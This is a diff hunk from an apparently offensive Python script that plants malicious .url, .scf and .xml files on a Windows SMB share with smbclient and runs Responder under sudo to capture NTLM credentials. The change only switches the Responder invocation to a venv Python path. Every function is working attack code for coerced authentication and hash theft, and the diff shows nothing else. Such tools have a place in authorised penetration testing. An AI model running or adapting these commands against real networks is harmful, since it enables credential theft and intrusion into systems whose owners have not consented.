@@ -104,34 +104,34 @@ def xml():
 def URL_File():
 	if (USERNAME != None and PASSWORD != None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.url'""")
-		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+		os.system("""sudo /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I """+INTERFACE+""" -wv""") 
 	else:
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.url'""")
-		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+		os.system("""sudo /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I """+INTERFACE+""" -wv""") 
 
 def SCF_File():
 	if (USERNAME != None and PASSWORD != None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.scf'""")
-		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+		os.system("""sudo /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I """+INTERFACE+""" -wv""") 
 	else:
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.scf'""")
-		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+		os.system("""sudo /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I """+INTERFACE+""" -wv""") 
 
 def XML_File():
 	if (USERNAME != None and PASSWORD != None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.xml'""")
-		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+		os.system("""sudo /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I """+INTERFACE+""" -wv""") 
 	else:
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.xml'""")
-		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+		os.system("""sudo /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I """+INTERFACE+""" -wv""") 
 
 def ALL():
 	if (USERNAME != None and PASSWORD != None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.xml; put @evil.scf; put @evil.url'""")
-		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+		os.system("""sudo /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I """+INTERFACE+""" -wv""") 
 	else:
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.xml; put @evil.url; put @evil.scf'""")
-		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+		os.system("""sudo /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I """+INTERFACE+""" -wv""") 
 
 if args.url == True:
 	url()
